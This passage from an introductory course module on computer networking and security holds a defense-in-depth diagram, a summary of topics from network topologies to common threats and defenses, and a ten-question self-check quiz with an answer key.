│           Physical Security                │ ← Locked server room
│  ┌──────────────────────────────────────┐  │
│  │         Perimeter Security           │  │ ← Firewall, IPS
│  │  ┌────────────────────────────────┐  │  │
│  │  │      Network Security          │  │  │ ← VPN, network segmentation
│  │  │  ┌──────────────────────────┐  │  │  │
│  │  │  │    Host Security         │  │  │  │ ← Antivirus, OS patches
│  │  │  │  ┌────────────────────┐  │  │  │  │
│  │  │  │  │  Application Sec.  │  │  │  │  │ ← Input validation, auth
│  │  │  │  │  ┌──────────────┐  │  │  │  │  │
│  │  │  │  │  │  Data Sec.   │  │  │  │  │  │ ← Encryption, backups
│  │  │  │  │  └──────────────┘  │  │  │  │  │
│  │  │  │  └────────────────────┘  │  │  │  │
│  │  │  └──────────────────────────┘  │  │  │
│  │  └────────────────────────────────┘  │  │
│  └──────────────────────────────────────┘  │
└────────────────────────────────────────────┘
```

---

## 13. Module Summary

Key takeaways from Module 6:

- A **computer network** connects devices to share resources and communicate. Classified by scale: PAN, LAN, MAN, WAN, WLAN, VPN.
- **Network topologies** (Bus, Star, Ring, Mesh, Hybrid) describe how devices are arranged and connected. Star is the most common in modern LANs.
- **Network hardware:** NICs (MAC addresses), hubs (broadcast), switches (MAC-based forwarding), routers (IP-based routing), access points, modems, and firewalls.
- The **OSI Model** has 7 layers — Physical, Data Link, Network, Transport, Session, Presentation, Application — each handling a specific aspect of communication. Data is **encapsulated** going down and **de-encapsulated** going up.
- The **TCP/IP model** is the practical 4-layer internet model. **TCP** provides reliable, ordered delivery; **UDP** is faster but unreliable.
- **IP addresses** are logical network identifiers. IPv4 is 32-bit (exhausted); IPv6 is 128-bit (nearly inexhaustible). **DHCP** assigns IPs automatically; **DNS** translates names to IPs.
- Key protocols: **DNS** (name resolution), **HTTP/HTTPS** (web), **SMTP/IMAP** (email), **SSH** (secure remote access), with port numbers identifying specific services.
- The **CIA Triad** (Confidentiality, Integrity, Availability) is the core framework of information security.
- Common threats include **malware** (viruses, worms, ransomware, trojans), **phishing**, **MitM attacks**, **DDoS**, **SQL injection**, and **XSS**.
- Defenses include **firewalls**, **encryption** (symmetric AES, asymmetric RSA, TLS), **MFA**, **IDS/IPS**, **VPN**, **PKI/certificates**, and the layered approach of **defense in depth**.

---

## 14. Module Quiz

Test your understanding of Module 6.

---

**Question 1**
Which network type covers the largest geographic area and includes the internet as its most prominent example?

- A) LAN
- B) MAN
- C) WAN
- D) PAN

---

**Question 2**
In a **star topology**, what happens if the central switch fails?

- A) Only the devices directly connected to the failed port are affected
- B) The network continues to function using alternate paths
- C) The entire network goes down, as all devices depend on the central switch
- D) Devices switch automatically to a bus topology

---

**Question 3**
At which OSI layer do **routers** primarily operate, and what addressing system do they use?

- A) Layer 1 (Physical); MAC addresses
- B) Layer 2 (Data Link); MAC addresses
- C) Layer 3 (Network); IP addresses
- D) Layer 4 (Transport); Port numbers

---

**Question 4**
Which of the following scenarios calls for **UDP** rather than TCP?

- A) Downloading a software installer file
- B) Sending an important email
- C) Live video game where low latency matters more than occasional dropped packets
- D) Transferring a bank transaction record

---

**Question 5**
A device on a home network has the IP address `192.168.1.45`. What type of IP address is this?

- A) A public IPv4 address assigned by an ISP
- B) A private IPv4 address not routable on the public internet
- C) An IPv6 address in shorthand notation
- D) A loopback address used for self-testing

---

**Question 6**
You receive an email from `support@paypa1.com` telling you your account has been suspended and asking you to click a link urgently. What type of attack is this?

- A) DDoS Attack
- B) SQL Injection
- C) Phishing
- D) Man-in-the-Middle Attack

---

**Question 7**
The **WannaCry** attack in 2017 is a well-known example of which type of malware?

- A) Spyware
- B) Trojan Horse
- C) Ransomware Worm
- D) Rootkit

---

**Question 8**
Which security principle ensures that **even if an attacker steals your password**, they still cannot access your account?

- A) Encryption at rest
- B) Multi-Factor Authentication (MFA)
- C) A strong firewall
- D) A VPN connection

---

**Question 9**
Which statement best describes the difference between the **Internet** and the **World Wide Web**?

- A) They are the same thing — different names for the same system
- B) The internet is a service that runs on top of the World Wide Web
- C) The World Wide Web is one service (HTTP-based documents) that runs on top of the internet infrastructure
- D) The World Wide Web is faster than the internet for file transfers

---

**Question 10** *(Short Answer)*
Explain the **CIA Triad** and for each principle, provide a real-world example of a cyber threat that violates it and a specific security mechanism that protects it.

---

### Answer Key

| Question | Answer | Explanation |
|---|---|---|
| 1 | **C** | WAN (Wide Area Network) spans countries/continents. The internet is the world's largest WAN. |
| 2 | **C** | In star topology, all devices connect to a central switch. If it fails, all communication ceases — the central switch is a single point of failure. |
| 3 | **C** | Routers operate at Layer 3 (Network layer) of the OSI model and use **IP addresses** to make routing decisions across different networks. |
| 4 | **C** | UDP is preferred for live gaming because low latency is critical — a slightly dropped packet is acceptable, but a delay in TCP retransmission would cause unacceptable lag. |
| 5 | **B** | `192.168.x.x` is a private IPv4 range reserved for local networks. It is not routable on the public internet; the router uses NAT to map it to the public IP. |
| 6 | **C** | This is a classic **phishing** attack — impersonating a legitimate company (PayPal) with urgency and a fake domain (`paypa1.com`) to steal credentials. |
| 7 | **C** | WannaCry was **ransomware** (it encrypted files and demanded payment) and a **worm** (it self-propagated automatically across networks via the EternalBlue exploit). |
| 8 | **B** | **MFA** requires a second factor (phone OTP, biometric) beyond the password. Even with a stolen password, an attacker cannot log in without the second factor. |
| 9 | **C** | The internet is the physical/logical infrastructure (cables, routers, TCP/IP). The WWW is an application layer service — a system of HTTP-linked documents — that runs over the internet. Email, gaming, and VoIP are also internet services, separate from the WWW. |
| 10 | *(See below)* | |

**Question 10 – Sample Answer:**

> The **CIA Triad** is the foundational framework of information security, consisting of three principles that all security measures aim to protect:
>
> **1. Confidentiality** — Information must be accessible only to authorized parties.
> - *Threat:* A **man-in-the-middle attack** on an unencrypted HTTP connection at a coffee shop allows an attacker to read a user's login credentials as they are transmitted.
> - *Defense:* **TLS/HTTPS encryption** scrambles the data in transit so that even if intercepted, it is unreadable without the decryption key.
>
> **2. Integrity** — Data must be accurate and unaltered by unauthorized parties.
> - *Threat:* A **MitM attacker** intercepts a bank transfer request and modifies the recipient account number before forwarding it — the bank receives a tampered instruction.
> - *Defense:* **Digital signatures and TLS** use cryptographic hashing to ensure that any tampering with data in transit is detected — if the data changes, the hash won't match and the receiver knows the data is invalid.
>
> **3. Availability** — Systems and data must be accessible to authorized users when needed.
> - *Threat:* A **DDoS attack** floods a hospital's online appointment system with millions of fake requests, overwhelming the server and making it impossible for patients to book appointments or access medical records.
> - *Defense:* **DDoS mitigation services** (such as Cloudflare), **rate limiting**, and **load balancing** distribute traffic and filter out malicious floods, ensuring the service remains accessible to legitimate users.

---

*End of Module 6 — Up next: **Module 7: Programming Fundamentals***
